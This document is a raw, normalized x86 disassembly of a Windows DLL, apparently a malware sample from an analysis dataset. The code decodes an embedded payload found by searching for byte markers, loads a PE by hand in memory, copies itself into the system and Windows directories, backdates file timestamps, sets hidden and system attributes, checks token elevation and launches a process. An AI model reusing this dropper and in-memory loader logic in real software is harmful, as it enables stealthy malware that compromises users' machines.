sub_10001050
push ecx
push esi
push edi
push rw-data
call sub_10001000
add esp 0x4
push rw-data
push eax
call [ GetProcAddress@IAT ]
push 0x0
mov [ rw-data ] eax
mov [ esp + 0xc ] 0x0
call [ CoInitialize@IAT ]
mov eax [ esp + 0x10 ]
push eax
call sub_10001020
mov ecx [ esp + 0x18 ]
mov edi eax
push ecx
call sub_10001020
mov esi eax
add esp 0x8
test esi esi
je r-xdata
test edi edi
je r-xdata
lea edx [ esp + 0x8 ]
push edx
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
test eax eax
pop esi
je r-xdata
mov eax [ edi ]
push edi
call [ eax + 0x8 ]
mov edx [ esi ]
push esi
call [ edx + 0x8 ]
mov ecx [ eax ]
push 0x10840014
push eax
call [ ecx + 0x14 ]
mov eax [ esp + 0x8 ]
push 0x0
push rw-data
push esi
mov edx [ eax ]
push edi
push eax
call [ edx + 0x40 ]
mov eax [ esp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x54 ]
call [ CoUninitialize@IAT ]
pop ecx
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_10001120
push esi
mov esi [ esp + 0x10 ]
push edi
push esi
call [ DeleteFileA@IAT ]
mov edi [ esp + 0xc ]
test edi edi
jne r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push esi
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
pop edi
xor eax eax
pop esi
retn
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
push 0x0
push eax
push ecx
push edi
push esi
mov [ esp + 0x28 ] 0x0
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
mov eax 0x1
pop esi
retn
pop edi
xor eax eax
pop esi
retn
sub_10001190
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
xor ecx ecx
test edi edi
jle r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov eax [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
sub esi eax
pop edi
pop esi
xor eax eax
pop ebx
retn
inc ecx
inc eax
cmp ecx edi
jl r-xdata
mov dl [ esi + eax ]
mov bl [ eax ]
cmp dl bl
jne r-xdata
sub_100011d0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x20 ]
cmp edi eax
jg r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
xor esi esi
sub eax edi
mov [ esp + 0x20 ] eax
js r-xdata
mov ebp [ esp + 0x1c ]
mov ebx [ esp + 0x14 ]
lea eax [ esi + ebx ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x20 ]
inc esi
cmp esi eax
jle r-xdata
push edi
lea eax [ esi + ebx ]
push ebp
push eax
call sub_10001190
add esp 0xc
cmp eax 0x1
je r-xdata
sub_10001220
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
mov ebp [ VirtualAlloc@IAT ]
push edi
mov ebx [ esi + 0x3c ]
push 0x4
add ebx esi
push 0x2000
mov eax [ ebx + 0x50 ]
mov ecx [ ebx + 0x34 ]
push eax
push ecx
call ebp
mov edi eax
test edi edi
mov [ esp + 0x10 ] edi
jne r-xdata
push 0x14
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebp eax
xor eax eax
push 0x4
push 0x1000
mov [ ebp + 0x4 ] edi
mov [ ebp + 0xc ] eax
mov [ ebp + 0x8 ] eax
mov [ ebp + 0x10 ] eax
mov eax [ ebx + 0x50 ]
push eax
push edi
call [ VirtualAlloc@IAT ]
mov ecx [ ebx + 0x54 ]
push 0x4
push 0x1000
push ecx
push edi
call [ VirtualAlloc@IAT ]
mov ecx [ ebx + 0x54 ]
mov edi [ esi + 0x3c ]
add ecx edi
mov edi eax
mov edx ecx
push ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x18 ]
push ecx
mov edx [ ecx + 0x3c ]
add eax edx
mov [ ebp ] eax
mov [ eax + 0x34 ] esi
call sub_10001350
mov ecx [ ebx + 0x34 ]
mov eax esi
add esp 0xc
sub eax ecx
je r-xdata
mov edx [ ebx + 0x50 ]
push 0x4
push 0x2000
push edx
push eax
call ebp
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
push ebp
call sub_10001560
add esp 0x4
test eax eax
je r-xdata
push eax
push ebp
call sub_100014e0
add esp 0x8
mov edi [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebp
call sub_10001720
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebp
call sub_10001420
mov eax [ ebp ]
add esp 0x4
mov eax [ eax + 0x28 ]
test eax eax
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
add eax esi
test eax eax
je r-xdata
push 0x0
push 0x1
push esi
call eax
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] 0x1
sub_10001350
push ecx
mov eax [ esp + 0x10 ]
push ebx
push ebp
xor ecx ecx
mov ebp [ eax + 0x4 ]
mov eax [ eax ]
mov [ esp + 0x8 ] 0x0
mov cx [ eax + 0x14 ]
cmp [ eax + 0x6 ] 0x0
lea ebx [ ecx + eax + 0x18 ]
jbe r-xdata
pop ebp
pop ebx
pop ecx
retn
push esi
push edi
add ebx 0x10
mov ecx [ ebx - 0x4 ]
mov eax [ ebx ]
push 0x4
push 0x1000
add ecx ebp
push eax
push ecx
call [ VirtualAlloc@IAT ]
mov ecx [ ebx ]
mov esi [ ebx + 0x4 ]
mov edi [ esp + 0x18 ]
mov edx ecx
add esi edi
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ ebx - 0x8 ] eax
mov edx [ esp + 0x1c ]
mov esi [ edx + 0x38 ]
test esi esi
jle r-xdata
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
inc eax
add ebx 0x28
mov edx [ ecx ]
xor ecx ecx
mov [ esp + 0x10 ] eax
mov cx [ edx + 0x6 ]
cmp eax ecx
jl r-xdata
mov eax [ ebx - 0x4 ]
push 0x4
push 0x1000
add eax ebp
push esi
push eax
call [ VirtualAlloc@IAT ]
mov ecx esi
mov edi eax
mov edx ecx
xor eax eax
shr ecx 0x2
mov [ ebx - 0x8 ] edi
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
jmp r-xdata
sub_10001420
push ecx
mov eax [ esp + 0x8 ]
push ebx
xor ecx ecx
push ebp
mov ebx [ eax ]
xor ebp ebp
mov cx [ ebx + 0x14 ]
cmp [ ebx + 0x6 ] bp
lea eax [ ecx + ebx + 0x18 ]
jbe r-xdata
pop ebp
pop ebx
pop ecx
retn
push esi
push edi
lea edi [ eax + 0x24 ]
lea ecx [ edx + ecx * 2 ]
test eax 0x4000000
lea edx [ esi + ecx * 2 ]
mov esi [ edx * 4 + rw-data ]
je r-xdata
mov edx [ edi - 0x14 ]
mov eax [ edi - 0x1c ]
push 0x4000
push edx
push eax
call [ VirtualFree@IAT ]
jmp r-xdata
mov edx [ edi - 0x14 ]
mov ecx edx
test ecx ecx
jne r-xdata
or esi 0x200
mov edx [ esp + 0x18 ]
xor eax eax
inc ebp
add edi 0x28
mov ebx [ edx ]
mov ax [ ebx + 0x6 ]
cmp ebp eax
jl r-xdata
jbe r-xdata
test al 0x40
je r-xdata
mov eax [ edi ]
mov ecx eax
mov edx eax
shr ecx 0x1d
shr edx 0x1e
mov esi eax
and ecx 0x1
and edx 0x1
shr esi 0x1f
test eax 0x2000000
je r-xdata
pop edi
pop esi
mov ecx [ edi - 0x1c ]
lea eax [ esp + 0x10 ]
push eax
push esi
push edx
push ecx
call [ VirtualProtect@IAT ]
test al 0x80
je r-xdata
mov ecx [ ebx + 0x20 ]
jmp r-xdata
mov ecx [ ebx + 0x24 ]
test ecx ecx
sub_100014e0
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
mov eax [ eax ]
add eax 0xa0
mov ecx [ eax + 0x4 ]
test ecx ecx
jbe r-xdata
pop ebx
retn
mov ecx [ eax ]
mov eax [ ecx + ebx ]
add ecx ebx
test eax eax
jbe r-xdata
push ebp
push esi
push edi
add ecx [ ecx + 0x4 ]
mov eax [ ecx ]
test eax eax
ja r-xdata
xor eax eax
mov ax [ edx ]
mov ebp eax
and ebp 0xfffff000
cmp ebp 0x3000
jne r-xdata
lea edi [ eax + ebx ]
mov eax [ ecx + 0x4 ]
sub eax 0x8
xor esi esi
test eax 0xfffffffe
lea edx [ ecx + 0x8 ]
jbe r-xdata
pop edi
pop esi
pop ebp
mov eax [ ecx + 0x4 ]
inc esi
sub eax 0x8
add edx 0x2
shr eax 0x1
cmp esi eax
jb r-xdata
mov ebp [ esp + 0x18 ]
and eax 0xfff
add eax edi
add [ eax ] ebp
sub_10001560
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
mov ebx 0x1
mov eax [ edi ]
mov ebp [ edi + 0x4 ]
add eax 0x80
mov ecx [ eax + 0x4 ]
test ecx ecx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
mov esi [ eax ]
push 0x14
add esi ebp
push esi
mov [ esp + 0x18 ] esi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
add eax ebp
push eax
call [ LoadLibraryA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ edi + 0xc ]
mov edx [ edi + 0x8 ]
lea ecx [ eax * 4 + 0x4 ]
push ecx
push edx
call sub_100040dc
add esp 0x8
mov [ edi + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov [ eax + ecx * 4 ] ebx
mov edx [ edi + 0xc ]
inc edx
mov [ edi + 0xc ] edx
mov eax [ esi ]
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
lea edi [ edx + ebp ]
mov esi edi
mov esi [ esi + 0x10 ]
lea edi [ eax + ebp ]
add esi ebp
jmp r-xdata
mov eax [ esp + 0x10 ]
push 0x14
add eax 0x14
push eax
mov [ esp + 0x18 ] eax
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
test eax 0x80000000
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x10 ]
jmp r-xdata
lea eax [ eax + ebp + 0x2 ]
and eax 0xffff
jmp r-xdata
mov eax [ edi + 0x4 ]
add edi 0x4
add esi 0x4
test eax eax
jne r-xdata
push eax
push ebx
call [ GetProcAddress@IAT ]
test eax eax
mov [ esi ] eax
je r-xdata
sub_10001680
mov ecx [ esp + 0x4 ]
push ebx
push ebp
push esi
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
add ecx 0x78
push edi
mov [ esp + 0x14 ] eax
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov esi [ ecx ]
mov ecx [ esi + eax + 0x18 ]
add esi eax
test ecx ecx
je r-xdata
mov edx [ esi + 0x14 ]
test edx edx
je r-xdata
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
add edi eax
add ebx eax
xor ebp ebp
test ecx ecx
jbe r-xdata
jmp r-xdata
mov ecx [ edi ]
mov edx [ esp + 0x18 ]
add ecx eax
push ecx
push edx
call sub_10009820
add esp 0x8
test eax eax
je r-xdata
xor eax eax
mov ax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x18 ]
inc ebp
add edi 0x4
add ebx 0x2
cmp ebp eax
jb r-xdata
cmp eax [ esi + 0x14 ]
ja r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esi + 0x1c ]
pop edi
pop esi
pop ebp
lea edx [ ecx + eax * 4 ]
mov ecx [ esp + 0x8 ]
pop ebx
mov eax [ edx + ecx ]
add eax ecx
retn
sub_10001720
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
push 0x0
push 0x0
mov edx [ ecx + 0x28 ]
push eax
add edx eax
call edx
mov [ esi + 0x10 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push edi
xor edi edi
test eax eax
jle r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push eax
call [ VirtualFree@IAT ]
mov ecx [ esi + 0x8 ]
push ecx
call sub_1000440b
add esp 0x4
pop edi
push ebx
mov ebx [ FreeLibrary@IAT ]
mov eax [ esi + 0xc ]
inc edi
cmp edi eax
jl r-xdata
push eax
call ebx
mov eax [ esi + 0x8 ]
mov eax [ eax + edi * 4 ]
cmp eax 0xffffffff
je r-xdata
pop ebx
sub_100017b0
mov eax [ rw-data ]
sub esp 0x334
test eax eax
push ebx
push edi
je r-xdata
mov ecx 0x85
xor eax eax
lea edi [ esp + 0x125 ]
mov [ esp + 0x124 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x21 ]
mov [ esp + 0x20 ] 0x0
[ edi ]
mov ecx [ rw-data ]
push 0x103
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x24 ]
push eax
push ecx
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x124 ]
lea eax [ esp + 0x20 ]
push edx
push eax
call sub_10003430
add esp 0x8
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop ebx
add esp 0x334
retn
mov ecx [ esp + 0x32c ]
push ebp
push esi
lea edx [ esp + 0x10 ]
mov eax [ ecx + 0x3c ]
push 0x6
add eax ecx
xor ecx ecx
push edx
mov cx [ eax + 0x14 ]
mov [ esp + 0x18 ] 0x43
mov [ esp + 0x1a ] 0x74
mov [ esp + 0x1c ] 0x65
lea eax [ ecx + eax + 0x18 ]
mov cl 0x69
mov [ esp + 0x19 ] cl
mov [ esp + 0x1b ] cl
mov [ esp + 0x1d ] 0x73
mov ecx [ eax + 0x10 ]
push ecx
push eax
call sub_100011d0
mov esi eax
add esi 0x6
mov ebp [ esi ]
push ebp
call sub_100040ce
mov ecx ebp
mov ebx eax
mov edx ecx
xor eax eax
mov edi ebx
add esi 0x4
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx ebp
mov edi ebx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x140 ]
push ecx
call sub_10003500
mov eax [ ebx ]
push eax
mov [ esp + 0x3c ] eax
call sub_100040ce
mov ecx [ esp + 0x3c ]
mov esi eax
mov edx ecx
xor eax eax
mov edi esi
add esp 0x1c
shr ecx 0x2
[ edi ]
mov ecx edx
mov [ esp + 0x24 ] esi
and ecx 0x3
[ edi ]
xor edi edi
test ebp ebp
jbe r-xdata
add ebp 0xfffffffc
lea edx [ ebx + 0x4 ]
push ebp
lea eax [ esp + 0x24 ]
push edx
push eax
push esi
call sub_10009b00
add esp 0x10
test eax eax
jne r-xdata
mov al [ edi + ebx ]
xor al 0x37
mov cl al
and cl 0xf
shl cl 0x4
shr al 0x4
add cl al
mov [ edi + ebx ] cl
inc edi
cmp edi ebp
jb r-xdata
pop esi
pop ebp
test ebx ebx
je r-xdata
mov ecx [ esi ]
lea ebp [ esi + 0x11 ]
mov [ rw-data ] ecx
mov [ rw-data ] ebp
add ebp [ esi ]
call sub_10001b60
test eax eax
je r-xdata
push ebx
call sub_100044f4
add esp 0x4
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add ecx edx
add ebp ecx
call sub_10002150
cmp eax 0x80
jb r-xdata
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x18 ]
push 0x8
push edx
mov cl 0x55
push eax
push ebp
mov [ rw-data ] eax
mov [ rw-data ] ebp
mov [ esp + 0x28 ] 0x50
mov [ esp + 0x29 ] 0x4c
mov [ esp + 0x2a ] cl
mov [ esp + 0x2b ] 0x53
mov [ esp + 0x2c ] cl
mov [ esp + 0x2d ] 0x4e
mov [ esp + 0x2e ] 0x49
mov [ esp + 0x2f ] 0x54
call sub_100011d0
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x4 ]
add ebp eax
mov eax [ esi + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] ebp
jmp r-xdata
mov ecx 0x4b
mov esi rw-data
mov edi eax
[ edi ] [ esi ]
mov esi [ esp + 0x24 ]
mov edx [ esi + 0xc ]
mov [ rw-data ] ebp
mov [ rw-data ] edx
sub_10001a00
sub esp 0x330
push ebx
push ebp
push esi
push edi
call sub_100017b0
mov ecx 0xcb
xor eax eax
lea edi [ esp + 0x11 ]
mov esi rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x4b
lea edi [ esp + 0x10 ]
[ edi ] [ esi ]
mov ecx [ rw-data ]
lea eax [ esp + 0x210 ]
push 0x12c
push eax
push ecx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov ebp [ esp + 0x344 ]
test eax eax
mov [ esp + 0x33c ] ebp
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x330
retn
mov ecx [ rw-data ]
test ecx ecx
jbe r-xdata
push eax
call sub_10001220
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push rw-data
push ebx
call sub_10001680
add esp 0x8
test eax eax
je r-xdata
sub esp 0x330
mov ecx 0xcc
lea esi [ esp + 0x340 ]
mov edi esp
[ edi ] [ esi ]
call eax
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x330
retn
cmp ebp 0x1
jne r-xdata
push rw-data
push ebx
call sub_10001680
add esp 0x8
test eax eax
je r-xdata
push rw-data
call eax
mov esi eax
sub_10001af0
sub esp 0xc
lea eax [ esp ]
mov [ esp + 0x4 ] 0x0
push eax
push 0x8
mov [ esp + 0x8 ] 0x0
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
and eax 0xff
add esp 0xc
retn
mov edx [ esp + 0x10 ]
mov eax [ esp ]
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x0
push ecx
push 0x4
push edx
push 0x12
push eax
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov ecx [ esp ]
push ecx
call [ CloseHandle@IAT ]
mov [ esp + 0x4 ] 0x1
sub_10001b60
sub esp 0x24
push rw-data
call [ GetModuleHandleA@IAT ]
test eax eax
jne r-xdata
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov edx eax
test edx edx
jne r-xdata
add esp 0x24
retn
push edi
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
[ edi ]
lea eax [ esp + 0x4 ]
push eax
call edx
mov eax [ esp + 0x4 ]
pop edi
cmp ax 0x9
je r-xdata
add esp 0x24
retn
mov eax 0x1
add esp 0x24
retn
cmp ax 0x6
je r-xdata
xor eax eax
add esp 0x24
retn
sub_10001bd0
sub esp 0x12c
push ebx
push ebp
push esi
mov esi [ esp + 0x13c ]
push edi
push esi
mov edi 0x1
call sub_10003410
add esp 0x4
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn
mov ebx [ SetFileAttributesA@IAT ]
push 0x80
push esi
call ebx
mov ebp [ DeleteFileA@IAT ]
push esi
call ebp
test eax eax
jne r-xdata
mov ecx 0x4a
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] al
push esi
[ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ esp + 0x18 ]
push 0x12b
push eax
call sub_1000452d
lea ecx [ esp + 0x20 ]
push ecx
call sub_10003410
add esp 0x14
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push esi
call sub_100044ff
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn
lea edx [ esp + 0x10 ]
push 0x80
push edx
call ebx
lea eax [ esp + 0x10 ]
push eax
call ebp
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
call sub_100044ff
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn
sub_10001cc0
sub esp 0x12c
push edi
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x5 ]
mov [ esp + 0x4 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x4 ]
push eax
push 0x12c
call [ GetTempPathA@IAT ]
mov ecx [ esp + 0x134 ]
lea edx [ esp + 0x4 ]
push ecx
push 0x0
push rw-data
push edx
call [ GetTempFileNameA@IAT ]
pop edi
add esp 0x12c
retn
sub_10001d10
sub esp 0x164
push ebx
push ebp
mov ebp [ esp + 0x170 ]
push esi
push edi
push 0x80
push ebp
call [ SetFileAttributesA@IAT ]
xor eax eax
xor ebx ebx
mov [ esp + 0x28 ] eax
mov ecx 0x4a
mov [ esp + 0x2c ] eax
lea edi [ esp + 0x49 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x48 ] bl
mov [ esp + 0x34 ] eax
push 0x12c
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x4c ]
push ecx
stosb [ edi ]
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x48 ]
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push 0x80
and ecx 0x3
push 0x3
push ebx
push 0x1
[ edi ] [ esi ]
mov edi [ CreateFileA@IAT ]
lea eax [ esp + 0x5c ]
push 0x80000000
push eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
call edi
mov esi eax
cmp esi ebx
je r-xdata
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x28 ]
push ecx
push edx
mov [ esp + 0x30 ] 0x7d4
mov [ esp + 0x32 ] 0x8
mov [ esp + 0x36 ] 0x11
mov [ esp + 0x38 ] 0x14
mov [ esp + 0x3a ] bx
call [ SystemTimeToFileTime@IAT ]
lea eax [ esp + 0x38 ]
lea ecx [ esp + 0x40 ]
push eax
push ecx
call [ LocalFileTimeToFileTime@IAT ]
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x3c ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] ecx
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
push ecx
lea eax [ esp + 0x1c ]
push edx
push eax
push esi
call [ GetFileTime@IAT ]
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push 0x7
push ebp
call [ SetFileAttributesA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x164
retn
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
push esi
call [ SetFileTime@IAT ]
push esi
call [ CloseHandle@IAT ]
push ebx
push 0x80
push 0x3
push ebx
push 0x2
push 0x40000000
push ebp
call edi
mov esi eax
cmp esi ebx
je r-xdata
sub_10001ea0
sub esp 0x60c
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x69 ]
mov [ esp + 0x68 ] bl
push 0x12c
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x6c ]
push eax
call [ GetWindowsDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x68 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x68 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_10001bd0
add esp 0x4
test eax eax
jne r-xdata
xor ebp ebp
call sub_10002150
cmp eax 0x80
jae r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x60c
retn
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x1
push ecx
call sub_10001af0
mov edi [ esp + 0x14 ]
add esp 0x4
xor edx edx
cmp edi 0x3
sete dl
inc edx
mov esi edx
call sub_10001b60
test eax eax
je r-xdata
mov esi 0x1
jmp r-xdata
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x2c1 ]
mov [ esp + 0x2c0 ] bl
[ edi ]
mov ecx [ rw-data ]
push 0x12c
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x2c4 ]
push eax
push ecx
call [ GetModuleFileNameA@IAT ]
cmp esi 0x1
jne r-xdata
mov ebp 0x1
cmp esi 0x2
jne r-xdata
cmp ebp ebx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60c
retn
cmp ebp ebx
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea edx [ esp + 0x68 ]
push edx
push eax
push ecx
call sub_10001120
lea edx [ esp + 0x74 ]
push edx
call sub_10001d10
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60c
retn
lea edx [ esp + 0x68 ]
push esi
lea eax [ esp + 0x2c4 ]
push edx
push eax
call [ CopyFileA@IAT ]
lea ecx [ esp + 0x68 ]
push ecx
call sub_10001d10
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60c
retn
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x3ed ]
mov [ esp + 0x3ec ] bl
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x3ec ]
push ecx
stosb [ edi ]
call sub_10001cc0
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea edx [ esp + 0x3f0 ]
push edx
push eax
push ecx
call sub_10001120
mov ecx 0x4a
xor eax eax
lea edi [ esp + 0x1a5 ]
mov [ esp + 0x1a4 ] bl
[ edi ]
stosw [ edi ]
lea edx [ esp + 0x1a4 ]
push edx
stosb [ edi ]
call sub_10001cc0
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea eax [ esp + 0x1a8 ]
push eax
push ecx
push edx
call sub_10001120
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x48 ]
mov [ esp + 0x538 ] bl
[ edi ]
mov [ esp + 0x38 ] eax
mov ecx 0x40
mov [ esp + 0x3c ] eax
lea edi [ esp + 0x539 ]
mov [ esp + 0x40 ] eax
lea edx [ esp + 0x1b4 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x40c ]
mov [ esp + 0x34 ] ebx
push ecx
push edx
stosb [ edi ]
push rw-data
lea eax [ esp + 0x544 ]
push 0x103
push eax
mov [ esp + 0x58 ] 0x44
mov [ esp + 0x88 ] bx
call sub_1000452d
add esp 0x34
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x518 ]
push ecx
push edx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push eax
push ebx
call [ CreateProcessA@IAT ]
push rw-data
call sub_10003570
push ebx
push eax
lea eax [ esp + 0x2cc ]
push eax
push ebx
call sub_100038c0
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60c
retn
sub_10002150
mov eax [ rw-data ]
sub esp 0x9c
test eax eax
push esi
jne r-xdata
pop esi
add esp 0x9c
retn
mov esi [ GetVersionExA@IAT ]
push edi
mov ecx 0x26
lea edi [ esp + 0xc ]
[ edi ]
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x9c
push eax
call esi
test eax eax
pop edi
jne r-xdata
mov eax [ esp + 0x14 ]
dec eax
je r-xdata
lea ecx [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x94
push ecx
call esi
test eax eax
je r-xdata
xor eax eax
dec eax
jne r-xdata
mov [ rw-data ] 0x0
mov eax [ esp + 0x8 ]
cmp eax 0x5
jne r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ esp + 0xc ]
cmp eax 0x2
jne r-xdata
cmp eax 0x4
ja r-xdata
mov eax [ esp + 0xc ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax 0x40
pop esi
mov [ rw-data ] eax
add esp 0x9c
retn
mov eax 0x8
pop esi
mov [ rw-data ] eax
